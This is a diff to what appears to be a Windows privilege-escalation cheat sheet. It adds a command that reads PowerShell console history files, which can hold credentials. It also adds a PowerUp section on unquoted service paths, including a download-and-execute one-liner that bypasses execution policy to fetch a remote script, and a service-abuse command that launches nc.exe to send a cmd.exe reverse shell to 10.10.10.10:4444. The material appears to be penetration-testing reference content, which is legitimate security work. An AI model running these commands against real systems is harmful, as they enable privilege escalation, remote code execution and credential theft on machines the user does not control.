@@ -457,6 +457,7 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ### Powershell history
 
 ```powershell
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 cat (Get-PSReadlineOption).HistorySavePath
@@ -676,7 +677,24 @@ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
 
-Metasploit provides the exploit : `exploit/windows/local/trusted_service_path`
+* Metasploit exploit : `exploit/windows/local/trusted_service_path`
+* PowerUp exploit
+
+    ```powershell
+    # find the vulnerable application
+    C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
+
+    ...
+    [*] Checking for unquoted service paths...
+    ServiceName   : BBSvc
+    Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
+    StartName     : LocalSystem
+    AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
+    ...
+
+    # automatic exploit
+    Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
+    ```
 
 ### Example
 
